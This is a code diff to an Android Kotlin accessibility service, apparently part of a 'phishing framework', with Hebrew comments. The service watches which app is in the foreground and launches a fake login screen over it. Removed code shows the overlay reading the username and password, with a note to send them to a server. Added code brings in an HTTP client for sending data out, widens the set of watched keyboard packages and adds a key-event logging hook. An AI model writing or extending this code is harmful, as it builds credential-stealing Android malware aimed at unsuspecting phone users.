@@ -1,7 +1,9 @@
 package com.example.phishingframework
 
 import android.accessibilityservice.AccessibilityService
+import android.content.Context
 import android.content.Context.WINDOW_SERVICE
+import android.content.Intent
 import android.graphics.PixelFormat
 import android.util.Log
 import android.view.LayoutInflater
@@ -14,6 +16,19 @@ import androidx.core.content.ContextCompat.getSystemService
 import android.os.Handler
 import android.os.Looper
 import android.os.SystemClock
+import android.view.KeyEvent
+import android.view.ViewGroup.LayoutParams.MATCH_PARENT
+import android.view.WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
+import android.view.WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_VISIBLE
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.Callback
+import okhttp3.Response
+import java.io.IOException
+
 
 
 class PhishingAccessibilityService : AccessibilityService() {
@@ -27,6 +42,9 @@ class PhishingAccessibilityService : AccessibilityService() {
     private lateinit var windowManager: WindowManager
     private val handler = Handler(Looper.getMainLooper())
     private var pendingRemove: Runnable? = null
+
+    // יצרו קליינט אחד לשימוש חוזר לאורך חיי השירות
+    private val httpClient = OkHttpClient()
 
     // נזכור מתי הצגנו את ה-Overlay לאחרונה
     private var lastShowTime = 0L
@@ -60,7 +78,12 @@ class PhishingAccessibilityService : AccessibilityService() {
         val selfPkg = applicationContext.packageName
         val recentsPkgs = setOf(
             "com.android.systemui",
-            "com.samsung.android.app.cocktailbarservice"
+            "com.samsung.android.app.cocktailbarservice",
+            // IME שכיחות:
+            "com.android.inputmethod.latin",
+            "com.google.android.inputmethod.latin",
+            // אם יש מקלדת יצרן (לדוגמה סמסונג) – ניתן להוסיף גם:
+            "com.samsung.android.inputmethod"
         )
         val exitPkgs = setOf(
             "com.sec.android.app.launcher"
@@ -106,47 +129,30 @@ class PhishingAccessibilityService : AccessibilityService() {
 
     //מטפלת ב־“הצגת המסך המזויף” שלך ברגע הנכון, אוכלת את ה־layout, מחכה לאינטראקציה של המשתמש, ומשתמשת ב־WindowManager כדי לצוף מעל אפליקציות אחרות
     private fun showPhishingOverlay() {
-        //מונע קריאות כפולות שעלולות לגרום ל־addView חוזרות ולשגיאות
-        if (overlayView != null) return
-        pendingRemove?.let { handler.removeCallbacks(it) }
-        pendingRemove = null
-
-        //LayoutInflater: כלי שממיר קובץ XML ל־View בריצה
-        val inflater = LayoutInflater.from(this)
-        overlayView = inflater.inflate(R.layout.phishing_login_overlay, null)
-
-        // חיבור הכפתור
-        overlayView!!.findViewById<Button>(R.id.login_button).setOnClickListener {
-            val user = overlayView!!.findViewById<EditText>(R.id.username_field).text.toString()
-            val pass = overlayView!!.findViewById<EditText>(R.id.password_field).text.toString()
-            // TODO: כאן תשגרי ל-Server את user+pass
-            removeOverlay()
+        val intent = Intent(this, PhishingOverlayActivity::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         }
-
-        //הגדרת פרמטרי החלון (LayoutParams)
-        val params = WindowManager.LayoutParams(
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-            //מונע מהחלון לקבל את הפוקוס המלא, כדי שהמשתמש עדיין יוכל (במידת הצורך) ללחוץ על כפתורים של האפליקציה שמתחת
-            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
-            //מאפשר שקיפות (כפי שהגדרת ב־layout עם רקע חצי־שקוף)
-            PixelFormat.TRANSLUCENT
-        )
-
-        windowManager.addView(overlayView, params)
-        Log.i(TAG, "Phishing overlay shown")
-
-        lastShowTime = SystemClock.uptimeMillis()
-        Log.i(TAG, "Phishing overlay shown")
+        startActivity(intent)
     }
 
     private fun removeOverlay() {
         overlayView?.let {
+            // מסתירים את המקלדת לפני הסרת ה-overlay
+            val imm = getSystemService(Context.INPUT_METHOD_SERVICE)
+                    as android.view.inputmethod.InputMethodManager
+            imm.hideSoftInputFromWindow(it.windowToken, 0)
+
             windowManager.removeView(it)
             overlayView = null
             Log.i(TAG, "Phishing overlay removed")
         }
     }
+
+
+    override fun onKeyEvent(event: KeyEvent?): Boolean {
+        Log.i(TAG, "Key event: ${event?.keyCode}")
+        // החזר true אם “בלעת” את האירוע ולא רוצה שיגיע לאפליקציה; אחרת false
+        return false
+    }
+
 }
